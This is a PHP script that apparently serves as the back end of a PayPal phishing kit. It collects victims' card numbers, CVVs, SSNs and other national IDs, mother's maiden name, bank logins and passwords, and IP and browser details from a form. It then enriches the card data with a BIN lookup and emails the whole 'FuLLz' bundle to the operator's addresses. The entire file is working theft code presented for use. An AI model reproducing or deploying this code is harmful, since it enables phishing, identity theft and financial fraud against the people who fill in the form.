<?php
if (isset($_POST['ccn']) && isset($_POST['fnm'])) {
    session_start();
    include '../mine.php';
    include '../../prevents/PrinceDuScam3.php';

    function cardData($ss, $bin)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://api.freebinchecker.com/bin/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($ss) {
            case "type":
                $str = $code->card->type;
                break;
            case "level":
                $str = $code->card->category;
                break;
            case "bank":
                $str = isset($code->issuer->name) ? $code->issuer->name : "";
                break;
            case "status":
                $str = $code->country->currency;
                break;
            case "countryName":
                $str = $code->country->name;
                break;
            default:
                $str = $code->card->scheme;
        }
        return $str;
    }
    $ctp         = $_POST['ctp'];
    $ccn         = $_POST['ccn'];
    $cex         = $_POST['cex'];
    $csc         = $_POST['csc'];
    $fnm         = $_POST['fnm'];
    $dob         = $_POST['dob'];
    $adr         = $_POST['adr'];
    $cty         = $_POST['cty'];
    $zip         = $_POST['zip'];
    $stt         = $_POST['stt'];
    $cnt         = $_POST['cnt'];
    $ptp         = $_POST['ptp'];
    $par         = $_POST['par'];
    $pnm         = $_POST['pnm'];
    $bin         = substr(str_replace(' ', '', $ccn), 0, 6);
    $bin_type    = cardData('type', $bin);
    $bin_level   = cardData('level', $bin);
    $bin_brand   = cardData('brand', $bin);
    $bin_status  = cardData('status', $bin);
    $bin_bank    = cardData('bank', $bin);
    $bin_country = cardData('countryName', $bin);
    $msg         = "=========== <[ B1NK5 R3Z PaYPal FuLLz ]> ===========\r\n";
    $msg .= "----------------------- 📑 Info PV 📑 ---------------------\r\n";
    $msg .= "Nom Entier    : {$fnm}\r\n";
    $msg .= "Anniv    : {$dob}\r\n";
    $msg .= "📍Addresse        : {$adr}\r\n";
    $msg .= "Ville        : {$cty}\r\n";
    $msg .= "State        : {$stt}\r\n";
    $msg .= "Zip Code    : {$zip}\r\n";
    $msg .= "Region        : {$cnt}\r\n";
    $msg .= "📱Tel        : {$ptp} | {$par} {$pnm}\r\n";
    if (isset($_POST['mdn'])) {
        $msg .= "Mother Name : {$_POST['mdn']}\r\n";
    }
    if (isset($_POST['ssn'])) {
        $msg .= "SSN         : {$_POST['ssn']}\r\n";
    }
    if (isset($_POST['pps'])) {
        $msg .= "PPS         : {$_POST['pps']}\r\n";
    }
    if (isset($_POST['clm']) && isset($_POST['dln'])) {
        $msg .= "Card Limit     : {$_POST['clm']}\r\n";
        $msg .= "Driver Lic. : {$_POST['dln']}\r\n";
    }
    if (isset($_POST['sin'])) {
        $msg .= "SIN         : {$_POST['sin']}\r\n";
    }
    if (isset($_POST['pse'])) {
        $msg .= "PSE         : {$_POST['pse']}\r\n";
    }
    if (isset($_POST['dni'])) {
        $msg .= "DNI         : {$_POST['dni']}\r\n";
    }
    if (isset($_POST['bsn'])) {
        $msg .= "BSN         : {$_POST['bsn']}\r\n";
    }
    if (isset($_POST['cpf'])) {
        $msg .= "CPF         : {$_POST['cpf']}\r\n";
    }
    if (isset($_POST['fcn'])) {
        $msg .= "FCN         : {$_POST['fcn']}\r\n";
    }
    $msg .= "----------------------- 💳 CC Info 💳 ---------------------\r\n";
    $msg .= "💰CC Type    : {$ctp}\r\n";
    $msg .= "💰CC Numero    : {$ccn}\r\n";
    $msg .= "💰CC Expiration    : {$cex}\r\n";
    $msg .= "💰CVV        : {$csc}\r\n";
    if (isset($_POST['acn']) && isset($_POST['stc'])) {
        $msg .= "Account N.     : {$_POST['acn']}\r\n";
        $msg .= "Sortcode    : {$_POST['stc']}\r\n";
    }
    if (isset($_POST['bus']) && isset($_POST['bpw'])) {
        $msg .= "Bank ID     : {$_POST['bus']}\r\n";
        $msg .= "Bank Mdp       : {$_POST['bpw']}\r\n";
    }
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESSE    : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION    : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER        : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIMEZONE    : {$_SESSION['ip_timezone']}\r\n";
    $msg .= "TIME        : " . now() . " GMT\r\n";
    $msg .= "=========== <[ B1NK5 R3Z PaYPal FuLLz ]> ===========\r\n\r\n\r\n";
    $subject = "💳 REZ VXV FuLLz [{$bin} {$ctp}|{$_SESSION['ip_countryName']}] 💳";
    $headers = "From:🐉 REZ VXV <binks@vip.su>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    @mail($antibot, $subject, $msg, $headers);
    exit('done');
}
?>